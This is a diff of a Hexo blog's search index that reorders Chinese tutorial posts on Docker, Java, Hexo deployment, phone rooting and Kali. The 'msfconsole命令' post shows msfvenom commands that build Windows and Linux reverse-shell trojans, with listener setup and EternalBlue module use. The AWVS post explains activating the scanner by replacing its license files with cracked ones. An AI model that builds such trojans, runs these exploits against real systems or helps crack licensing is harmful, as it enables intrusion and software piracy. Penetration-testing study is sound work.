@@ -429,6 +429,52 @@ mysql:5.7
       </tags>
   </entry>
   <entry>
+    <title>docker安装awvs并激活</title>
+    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
+    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
+<pre><code>docker search awvs
+</code></pre>
+<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
+<p>选择secfa&#x2F;awvs的镜像</p>
+<pre><code>docker pull secfa/awvs
+docker images -a
+</code></pre>
+<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
+<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
+</code></pre>
+<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
+<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
+</code></pre>
+<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
+<pre><code>awvs username: admin@admin.com
+awvs password: Admin123
+</code></pre>
+<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
+<pre><code>license_info.json
+wa_data.dat
+</code></pre>
+<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
+<pre><code>/home/acunetix/.acunetix/data/license
+</code></pre>
+<p>文件传输进入容器命令为：</p>
+<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
+docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
+</code></pre>
+<p>重启容器</p>
+<pre><code>docker restart 容器id
+</code></pre>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>awvs安装</tag>
+        <tag>awvs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CentOS Docker 安装</title>
     <url>/2024/08/09/docker%E5%AE%89%E8%A3%85/</url>
     <content><![CDATA[<h2 id="自动安装docker"><a href="#自动安装docker" class="headerlink" title="自动安装docker"></a>自动安装docker</h2><p>使用官方安装脚本自动安装：</p>
@@ -485,52 +531,6 @@ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
       </categories>
       <tags>
         <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker安装awvs并激活</title>
-    <url>/2024/08/11/docker%E5%AE%89%E8%A3%85awvs%E5%B9%B6%E6%BF%80%E6%B4%BB/</url>
-    <content><![CDATA[<h2 id="安装awvs"><a href="#安装awvs" class="headerlink" title="安装awvs"></a>安装awvs</h2><h4 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h4><p>搜索</p>
-<pre><code>docker search awvs
-</code></pre>
-<p>选择一个awvs镜像下载<br><img src="/images/pasted-35.png" alt="upload successful"></p>
-<p>选择secfa&#x2F;awvs的镜像</p>
-<pre><code>docker pull secfa/awvs
-docker images -a
-</code></pre>
-<h4 id="创建并启动容器"><a href="#创建并启动容器" class="headerlink" title="创建并启动容器"></a>创建并启动容器</h4><p>运行命令</p>
-<pre><code>docker run -it -d -p 3443:3443 secfa/docker-awvs
-</code></pre>
-<p>如果报错！（提示crack失败）<br>添加参数–cap-add LINUX_IMMUTABLE</p>
-<pre><code>docker run -itd -p 3443:3443 --cap-add LINUX_IMMUTABLE --name awvs secfa/docker-awvs
-</code></pre>
-<h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>账号密码：</p>
-<pre><code>awvs username: admin@admin.com
-awvs password: Admin123
-</code></pre>
-<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>需要下载破解版的两个文件替换，分别是：</p>
-<pre><code>license_info.json
-wa_data.dat
-</code></pre>
-<p>windows和linux文件通用<br>替换目录为容器内目录：</p>
-<pre><code>/home/acunetix/.acunetix/data/license
-</code></pre>
-<p>文件传输进入容器命令为：</p>
-<pre><code>docker cp license_info.json 容器的id:/home/acunetix/.acunetix/data/license
-docker cp wa_data.dat 容器的id:/home/acunetix/.acunetix/data/license
-</code></pre>
-<p>重启容器</p>
-<pre><code>docker restart 容器id
-</code></pre>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-        <tag>awvs安装</tag>
-        <tag>awvs</tag>
       </tags>
   </entry>
   <entry>
@@ -698,55 +698,6 @@ the next reboot or after you run partprobe(8) or kpartx(8)
       </tags>
   </entry>
   <entry>
-    <title>github部署hexo</title>
-    <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
-    <content><![CDATA[<h2 id="本地ssh连接-GitHub"><a href="#本地ssh连接-GitHub" class="headerlink" title="本地ssh连接 GitHub"></a>本地ssh连接 GitHub</h2><h4 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h4><p>确保下载了git后输入命令</p>
-<pre><code>git config --global user.name &quot;你的 GitHub 用户名&quot;
-git config --global user.email &quot;你的 GitHub 邮箱&quot;
-</code></pre>
-<p>创建 SSH 密匙（可以-f指定输出目录）</p>
-<pre><code>ssh-keygen -t rsa -C &quot;你的 GitHub 邮箱&quot;
-</code></pre>
-<p>什么都不用管，一路回车就行，创建好之后可以在.ssh看到有id_rsa.pub(.pub是公钥，id_rsa是私钥)。<br>打开 id_rsa.pub 并复制里面的内容。</p>
-<h4 id="在-GitHub-中添加-SSH-密钥"><a href="#在-GitHub-中添加-SSH-密钥" class="headerlink" title="在 GitHub 中添加 SSH 密钥"></a>在 GitHub 中添加 SSH 密钥</h4><p>回到 GitHub，进入 Settings：<br><img src="/images/pasted-11.png" alt="upload successful"></p>
-<p>选择左边栏的 SSH and GPG keys，点击 New SSH key：<br><img src="/images/pasted-12.png" alt="upload successful"></p>
-<p>Title 随便取，然后把 id_rsa.pub 里面的内容到复制到 Key 中，点击 Add SSH key：<br><img src="/images/pasted-13.png" alt="upload successful"></p>
-<p>保存完毕本地验证一下连接</p>
-<pre><code>ssh -T git@github.com
-</code></pre>
-<p>出现 “Are you sure……”，输入 yes 回车确认，若出现下图的提示即连接成功：<br><img src="/images/pasted-14.png" alt="upload successful"></p>
-<h2 id="创建-GitHub-仓库"><a href="#创建-GitHub-仓库" class="headerlink" title="创建 GitHub 仓库"></a>创建 GitHub 仓库</h2><p>GitHub 的主页 repository 中点击右上角的 New：<br><img src="/images/pasted-15.png" alt="upload successful"></p>
-<p>填写基本信息:<br>Repository name 中输入用户名.github.io，一定要是这个名字！<br>勾选 Add a README file<br><img src="/images/pasted-16.png" alt="upload successful"></p>
-<p>填好后点击 Create repository 创建仓库</p>
-<h2 id="上传-hexo-程序到-GitHub"><a href="#上传-hexo-程序到-GitHub" class="headerlink" title="上传 hexo 程序到 GitHub"></a>上传 hexo 程序到 GitHub</h2><p>需要先安装 hexo-deployer-git：</p>
-<pre><code>npm install hexo-deployer-git --save
-</code></pre>
-<p>修改_config.yml 文件末尾的 Deployment 部分：<br><img src="/images/pasted-17.png" alt="upload successful"></p>
-<p>修改成如下（修改为你的用户名与仓库名）<br><img src="/images/pasted-18.png" alt="upload successful"></p>
-<pre><code>deploy:
-  type: git
-  repo: git@github.com:w00123/w00123.github.io.git
-  branch: gh-pages
-</code></pre>
-<p>修改完成保存后运行</p>
-<pre><code>hexo c
-hexo d
-</code></pre>
-<p>出现下面的提示说明已经把网站上传到 GitHub 了：<br><img src="/images/pasted-19.png" alt="upload successful"></p>
-<p>然后我们需要在库设置（Repository Settings）中将默认分支设置为_config.yml 配置中的分支名称。<br><img src="/images/pasted-20.png" alt="upload successful"></p>
-<p>然后在 pages 页面调整源分支：<br><img src="/images/pasted-21.png" alt="upload successful"></p>
-<p>访问用户名.github.io就可以看到默认 hexo 了。</p>
-]]></content>
-      <categories>
-        <category>hexo博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>github</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hashcat爆破压缩包</title>
     <url>/2025/02/26/hashcat%E7%88%86%E7%A0%B4%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
     <content><![CDATA[<h2 id="hashcat下载"><a href="#hashcat下载" class="headerlink" title="hashcat下载"></a>hashcat下载</h2><p>windows需要下载两个工具，一个<code>hashcat</code>，一个<code>John the Ripper</code>，下面是下载地址：</p>
@@ -810,6 +761,55 @@ hexo d
       <tags>
         <tag>网络安全</tag>
         <tag>hashcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>github部署hexo</title>
+    <url>/2024/08/02/github%E9%83%A8%E7%BD%B2hexo/</url>
+    <content><![CDATA[<h2 id="本地ssh连接-GitHub"><a href="#本地ssh连接-GitHub" class="headerlink" title="本地ssh连接 GitHub"></a>本地ssh连接 GitHub</h2><h4 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h4><p>确保下载了git后输入命令</p>
+<pre><code>git config --global user.name &quot;你的 GitHub 用户名&quot;
+git config --global user.email &quot;你的 GitHub 邮箱&quot;
+</code></pre>
+<p>创建 SSH 密匙（可以-f指定输出目录）</p>
+<pre><code>ssh-keygen -t rsa -C &quot;你的 GitHub 邮箱&quot;
+</code></pre>
+<p>什么都不用管，一路回车就行，创建好之后可以在.ssh看到有id_rsa.pub(.pub是公钥，id_rsa是私钥)。<br>打开 id_rsa.pub 并复制里面的内容。</p>
+<h4 id="在-GitHub-中添加-SSH-密钥"><a href="#在-GitHub-中添加-SSH-密钥" class="headerlink" title="在 GitHub 中添加 SSH 密钥"></a>在 GitHub 中添加 SSH 密钥</h4><p>回到 GitHub，进入 Settings：<br><img src="/images/pasted-11.png" alt="upload successful"></p>
+<p>选择左边栏的 SSH and GPG keys，点击 New SSH key：<br><img src="/images/pasted-12.png" alt="upload successful"></p>
+<p>Title 随便取，然后把 id_rsa.pub 里面的内容到复制到 Key 中，点击 Add SSH key：<br><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p>保存完毕本地验证一下连接</p>
+<pre><code>ssh -T git@github.com
+</code></pre>
+<p>出现 “Are you sure……”，输入 yes 回车确认，若出现下图的提示即连接成功：<br><img src="/images/pasted-14.png" alt="upload successful"></p>
+<h2 id="创建-GitHub-仓库"><a href="#创建-GitHub-仓库" class="headerlink" title="创建 GitHub 仓库"></a>创建 GitHub 仓库</h2><p>GitHub 的主页 repository 中点击右上角的 New：<br><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p>填写基本信息:<br>Repository name 中输入用户名.github.io，一定要是这个名字！<br>勾选 Add a README file<br><img src="/images/pasted-16.png" alt="upload successful"></p>
+<p>填好后点击 Create repository 创建仓库</p>
+<h2 id="上传-hexo-程序到-GitHub"><a href="#上传-hexo-程序到-GitHub" class="headerlink" title="上传 hexo 程序到 GitHub"></a>上传 hexo 程序到 GitHub</h2><p>需要先安装 hexo-deployer-git：</p>
+<pre><code>npm install hexo-deployer-git --save
+</code></pre>
+<p>修改_config.yml 文件末尾的 Deployment 部分：<br><img src="/images/pasted-17.png" alt="upload successful"></p>
+<p>修改成如下（修改为你的用户名与仓库名）<br><img src="/images/pasted-18.png" alt="upload successful"></p>
+<pre><code>deploy:
+  type: git
+  repo: git@github.com:w00123/w00123.github.io.git
+  branch: gh-pages
+</code></pre>
+<p>修改完成保存后运行</p>
+<pre><code>hexo c
+hexo d
+</code></pre>
+<p>出现下面的提示说明已经把网站上传到 GitHub 了：<br><img src="/images/pasted-19.png" alt="upload successful"></p>
+<p>然后我们需要在库设置（Repository Settings）中将默认分支设置为_config.yml 配置中的分支名称。<br><img src="/images/pasted-20.png" alt="upload successful"></p>
+<p>然后在 pages 页面调整源分支：<br><img src="/images/pasted-21.png" alt="upload successful"></p>
+<p>访问用户名.github.io就可以看到默认 hexo 了。</p>
+]]></content>
+      <categories>
+        <category>hexo博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>github</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -1010,6 +1010,46 @@ hexo d
       </tags>
   </entry>
   <entry>
+    <title>java-linux安装卸载</title>
+    <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
+    <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
+<li><p>更新</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>下载<br>默认jdk</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure>
+<p>指定版本</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h2><ol>
+<li>如果安装了多个java版本，查看的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --list java</span><br></pre></td></tr></table></figure></li>
+<li>切换的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>根据需要填写编号即可。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><h3 id="查看已有版本"><a href="#查看已有版本" class="headerlink" title="查看已有版本"></a>查看已有版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep -i &quot;jdk\|jre\|java&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><ol>
+<li><p>卸载</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt purge openjdk-11-jdk openjdk-11-jre</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除多余残余设置</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+        <category>环境</category>
+      </categories>
+      <tags>
+        <tag>linux命令</tag>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hydra命令</title>
     <url>/2024/08/01/hydra%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h2 id="参数详解"><a href="#参数详解" class="headerlink" title="参数详解"></a>参数详解</h2><pre><code>-l login 小写，指定用户名进行破解
@@ -1082,43 +1122,27 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       </tags>
   </entry>
   <entry>
-    <title>java-linux安装卸载</title>
-    <url>/2025/02/21/java-linux%E5%88%87%E6%8D%A2%E5%AE%89%E8%A3%85%E7%89%88%E6%9C%AC/</url>
-    <content><![CDATA[<h2 id="下载jdk"><a href="#下载jdk" class="headerlink" title="下载jdk"></a>下载jdk</h2><ol>
-<li><p>更新</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>下载<br>默认jdk</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install default-jdk</span><br></pre></td></tr></table></figure>
-<p>指定版本</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h2><ol>
-<li>如果安装了多个java版本，查看的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --list java</span><br></pre></td></tr></table></figure></li>
-<li>切换的命令是<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --config java</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>根据需要填写编号即可。</p>
-</blockquote>
-</li>
-</ol>
-<h2 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h2><h3 id="查看已有版本"><a href="#查看已有版本" class="headerlink" title="查看已有版本"></a>查看已有版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep -i &quot;jdk\|jre\|java&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="卸载命令"><a href="#卸载命令" class="headerlink" title="卸载命令"></a>卸载命令</h3><ol>
-<li><p>卸载</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt purge openjdk-11-jdk openjdk-11-jre</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除多余残余设置</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt autoremove</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure></li>
-</ol>
+    <title>kali移动端（root安装，不改内核）</title>
+    <url>/2024/10/15/kali/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
+<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
+<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
+<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
+<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>点击移动端，mobile</p>
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
+<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
 ]]></content>
       <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-        <category>环境</category>
+        <category>手机搞机</category>
       </categories>
       <tags>
-        <tag>linux命令</tag>
-        <tag>java</tag>
+        <tag>kali</tag>
+        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -1150,30 +1174,6 @@ hydra -m cloud -P 密码字典 IP cisco-enable
         <tag>kali</tag>
         <tag>cupp</tag>
         <tag>字典</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali移动端（root安装，不改内核）</title>
-    <url>/2024/10/15/kali/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>把kali安在移动端，不论部署了什么工具和环境，可以随处携带，操作不方便可以局域网电脑远程使用、vnc等等。以上是我的使用场景也是折腾的原因。</p>
-<p>其实只有root的部分是最麻烦的，这个已经有很多教程了，可以慢慢看，建议先看手机的系统架构再看具体操作方法，不然在做什么都不知道。</p>
-<p>原理这块极客湾Geekerwan我感觉是说的很好的一个老师，视频链接放下面了<br>【玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！】 <a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&vd_source=772102c618b4c4a14c10923aa0e26404">https://www.bilibili.com/video/BV1BY4y1H7Mc/?share_source=copy_web&amp;vd_source=772102c618b4c4a14c10923aa0e26404</a></p>
-<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>肯定是需要现有一部root的手机，这个可以看我oppo root的帖子或者网上找相应方法去操作。<br>然后能科学上网，这个其实没有也没关系，但是会比较方便。<br>使用的是面具安装。</p>
-<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>bing搜索kali，点击下载</p>
-<p><img src="/images/pasted-64.png" alt="upload successful"></p>
-<p>点击移动端，mobile</p>
-<p><img src="/images/pasted-65.png" alt="upload successful"></p>
-<p>点击full的版本，因为我这个没有对应的手机，所以下载的是图中位置的镜像</p>
-<p><img src="/images/pasted-67.png" alt="upload successful"></p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在面具里面点击图中的本地安装，找到下载的镜像包，安装就是了<br><img src="/images/pasted-70.png" alt="upload successful"></p>
-<p>安装之后其实一切都安装好了，据说官方支持的root机会自动下载好关键的三个软件，但是我这个瞎搞的root机，没有下载，后来发现官网下载镜像那里有个软件商店可以下载。<br><img src="/images/pasted-72.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>手机搞机</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -1274,83 +1274,6 @@ hydra -m cloud -P 密码字典 IP cisco-enable
       <tags>
         <tag>硬盘分区</tag>
         <tag>分区扩容</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msfconsole命令</title>
-    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
-<pre><code>apt update # 更新安装包信息；只检查，不更新
-apt upgrade # 更新已安装的软件包，不删除旧包； 
-apt full-upgrade # 升级包，删除旧包
-</code></pre>
-<p>基础使用</p>
-<pre><code>msfconsole //进入框架
-search  ms17_010 //使用search命令查找相关漏洞
-use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
-info //使用info查看模块信息
-show options //查看参数
-set  RHOST  192.168.100.158 //设置参数
-exploit/run
-</code></pre>
-<p>辅助模块(auxiliary)</p>
-<p>漏洞利用(exploit)</p>
-<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
-<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
-</code></pre>
-<p>开启kali监听</p>
-<pre><code>启动msfconsole
-开启监听
-    use exploit/multi/handler
-设置tcp监听
-    set payload windows/meterpreter/reverse_tcp
-设置本机ip和端口
-    set
-输入explore开始监听
-</code></pre>
-<p>运行木马后木马上线，进入meterpreter</p>
-<p>后续同上，不做详细解释</p>
-<p>linux elf木马反弹shell创建（msf6版本）</p>
-<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
-</code></pre>
-<p>监听</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost xxx.xxx.xxx.xxx
-set lport 8888
-run
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-        <category>命令</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>渗透命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>oppoA9 mtk手机root</title>
-    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
-    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
-<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
-<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
-</code></pre>
-<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
-<p><img src="/images/pasted-2.png" alt="upload successful"></p>
-<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
-<p><img src="/images/pasted-3.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>手机搞机</category>
-      </categories>
-      <tags>
-        <tag>手机root</tag>
       </tags>
   </entry>
   <entry>
@@ -1463,6 +1386,83 @@ run
 <td align="center">TCP空扫描欺骗防火墙</td>
 </tr>
 </tbody></table>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>kali</category>
+        <category>命令</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>kali</tag>
+        <tag>渗透命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>oppoA9 mtk手机root</title>
+    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
+    <content><![CDATA[<h2 id="mtk手机root"><a href="#mtk手机root" class="headerlink" title="mtk手机root"></a>mtk手机root</h2><p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
+<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
+<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
+</code></pre>
+<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量+-键，插入数据线，等待软件连接<br>2、连接后通过读分区导出boot文件，不带后缀<br>3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
+<p><img src="/images/pasted-2.png" alt="upload successful"></p>
+<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
+<p><img src="/images/pasted-3.png" alt="upload successful"></p>
+]]></content>
+      <categories>
+        <category>手机搞机</category>
+      </categories>
+      <tags>
+        <tag>手机root</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>msfconsole命令</title>
+    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="攻击模块"><a href="#攻击模块" class="headerlink" title="攻击模块"></a>攻击模块</h2><p>软件更新</p>
+<pre><code>apt update # 更新安装包信息；只检查，不更新
+apt upgrade # 更新已安装的软件包，不删除旧包； 
+apt full-upgrade # 升级包，删除旧包
+</code></pre>
+<p>基础使用</p>
+<pre><code>msfconsole //进入框架
+search  ms17_010 //使用search命令查找相关漏洞
+use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
+info //使用info查看模块信息
+show options //查看参数
+set  RHOST  192.168.100.158 //设置参数
+exploit/run
+</code></pre>
+<p>辅助模块(auxiliary)</p>
+<p>漏洞利用(exploit)</p>
+<p>攻击载荷(payload)：<br>    Stager中几种常见的payload：<br>    windows&#x2F;meterpreter&#x2F;bind_tcp       &#x2F;&#x2F;正向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;反向连接，常用<br>    windows&#x2F;meterpreter&#x2F;reverse_http   &#x2F;&#x2F;通过监听80端口反向连接<br>    windows&#x2F;meterpreter&#x2F;reverse_https  &#x2F;&#x2F;通过监听443端口反向连接</p>
+<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>windows木马<br>创建木马</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
+</code></pre>
+<p>开启kali监听</p>
+<pre><code>启动msfconsole
+开启监听
+    use exploit/multi/handler
+设置tcp监听
+    set payload windows/meterpreter/reverse_tcp
+设置本机ip和端口
+    set
+输入explore开始监听
+</code></pre>
+<p>运行木马后木马上线，进入meterpreter</p>
+<p>后续同上，不做详细解释</p>
+<p>linux elf木马反弹shell创建（msf6版本）</p>
+<pre><code>    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
+</code></pre>
+<p>监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost xxx.xxx.xxx.xxx
+set lport 8888
+run
+</code></pre>
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -1717,6 +1717,23 @@ run
 ]]></content>
   </entry>
   <entry>
